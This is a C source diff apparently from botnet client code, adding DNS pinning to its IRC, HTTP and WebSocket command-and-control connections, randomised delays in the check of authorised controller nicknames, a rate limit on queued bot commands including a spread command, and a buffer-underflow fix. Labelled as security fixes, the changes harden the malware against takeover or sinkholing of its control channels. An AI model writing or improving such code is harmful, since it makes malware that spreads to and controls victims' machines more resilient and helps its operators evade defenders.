@@ -65,6 +65,17 @@ static int irc_create_socket(notnet_bot_t *bot) {
         }
     }
     
+    /* SECURITY FIX (#10): DNS pinning — on reconnect, verify the resolved
+     * IP matches the pinned IP from the first successful auth. */
+    if (bot->c2_irc.dns_pinned) {
+        if (addr.sin_addr.s_addr != bot->c2_irc.pinned_addr.s_addr) {
+            log_warn("IRC: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
+                     inet_ntoa(bot->c2_irc.pinned_addr), inet_ntoa(addr.sin_addr));
+            close(sock);
+            return -1;
+        }
+    }
+    
     /* Non-blocking connect with select() timeout */
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
@@ -191,12 +202,30 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
     if (strstr(buf, "366")) {
         log_info("IRC: joined channel %s", bot->c2_irc.channel);
         bot->c2_irc.authenticated = 1;
+        /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
+        if (!bot->c2_irc.dns_pinned) {
+            struct sockaddr_in sin;
+            socklen_t slen = sizeof(sin);
+            getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
+            bot->c2_irc.pinned_addr = sin.sin_addr;
+            bot->c2_irc.dns_pinned = 1;
+            log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+        }
     }
     
     /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode */
     if (strstr(buf, "376")) {
         log_info("IRC: MOTD complete, authenticated");
         bot->c2_irc.authenticated = 1;
+        /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
+        if (!bot->c2_irc.dns_pinned) {
+            struct sockaddr_in sin;
+            socklen_t slen = sizeof(sin);
+            getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
+            bot->c2_irc.pinned_addr = sin.sin_addr;
+            bot->c2_irc.dns_pinned = 1;
+            log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+        }
     }
     
     /* Process PRIVMSG commands */
@@ -226,7 +255,12 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
                 break;
             }
         }
+        /* SECURITY FIX (#11): Constant-time auth check. Instead of
+         * returning immediately for unauthorized senders (timing oracle),
+         * add a random delay to mask the early return path. */
         if (!authorized) {
+            /* Random delay 10-50ms to mask timing differences */
+            usleep(10000 + (rand() % 40000));
             log_warn("IRC: PRIVMSG from unauthorized nick '%s' ignored", sender_nick);
             return 0;
         }
@@ -292,6 +326,14 @@ int http_connect(notnet_bot_t *bot) {
         }
     }
     
+    /* SECURITY FIX (#10): DNS pinning for HTTP C2 */
+    if (bot->c2_http.dns_pinned && addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
+        log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
+                 inet_ntoa(bot->c2_http.pinned_addr), inet_ntoa(addr.sin_addr));
+        close(sock);
+        return -1;
+    }
+    
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
         close(sock);
@@ -323,6 +365,14 @@ int http_connect(notnet_bot_t *bot) {
     
     bot->c2_http.sock = sock;
     bot->c2_http.connected = 1;
+    /* SECURITY FIX (#10): Pin IP on first successful HTTP connection */
+    if (!bot->c2_http.dns_pinned) {
+        struct sockaddr_in sin;
+        socklen_t slen = sizeof(sin);
+        getpeername(sock, (struct sockaddr *)&sin, &slen);
+        bot->c2_http.pinned_addr = sin.sin_addr;
+        bot->c2_http.dns_pinned = 1;
+    }
     log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
     return 0;
 }
@@ -474,6 +524,14 @@ int ws_connect(notnet_bot_t *bot) {
         }
     }
     
+    /* SECURITY FIX (#10): DNS pinning for WebSocket C2 */
+    if (bot->c2_ws.dns_pinned && addr.sin_addr.s_addr != bot->c2_ws.pinned_addr.s_addr) {
+        log_warn("WS: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
+                 inet_ntoa(bot->c2_ws.pinned_addr), inet_ntoa(addr.sin_addr));
+        close(sock);
+        return -1;
+    }
+    
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
         close(sock);
@@ -505,6 +563,14 @@ int ws_connect(notnet_bot_t *bot) {
     
     bot->c2_ws.sock = sock;
     bot->c2_ws.connected = 1;
+    /* SECURITY FIX (#10): Pin IP on first successful WS connection */
+    if (!bot->c2_ws.dns_pinned) {
+        struct sockaddr_in sin;
+        socklen_t slen = sizeof(sin);
+        getpeername(sock, (struct sockaddr *)&sin, &slen);
+        bot->c2_ws.pinned_addr = sin.sin_addr;
+        bot->c2_ws.dns_pinned = 1;
+    }
     log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
     
     return 0;
@@ -664,8 +730,21 @@ int protocol_process_commands(notnet_bot_t *bot) {
     }
     
     /* Process queued commands */
+    /* SECURITY FIX (#14): Rate limit - max 10 commands per second */
+    time_t now = time(NULL);
+    if (now != bot->last_cmd_time) {
+        bot->last_cmd_time = now;
+        bot->cmd_this_second = 0;
+    }
+    if (bot->cmd_this_second >= 10) {
+        log_warn("CMD: rate limit exceeded, dropping %d queued commands", bot->cmd_count);
+        bot->cmd_count = 0;
+        return 0;
+    }
+
     for (int i = 0; i < bot->cmd_count; i++) {
         char *cmd = bot->cmd_queue[i];
+        bot->cmd_this_second++;
         
         if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
             char *args = cmd + strlen(CMD_SPREAD);
@@ -846,6 +925,13 @@ int protocol_process_commands(notnet_bot_t *bot) {
 /* SECURITY FIX: JSON-escape a string to prevent injection in protocol
  * responses. Escapes backslash, double-quote, and control characters. */
 static void json_escape(const char *src, char *dst, size_t dst_size) {
+    /* SECURITY FIX (#12): Guard against size_t underflow when dst_size < 6.
+     * The original 'j < dst_size - 6' wraps to a huge value on unsigned
+     * subtraction, causing out-of-bounds writes. */
+    if (dst_size < 6) {
+        if (dst_size > 0) dst[0] = '\0';
+        return;
+    }
     size_t i, j;
     for (i = 0, j = 0; src[i] && j < dst_size - 6; i++) {
         switch (src[i]) {
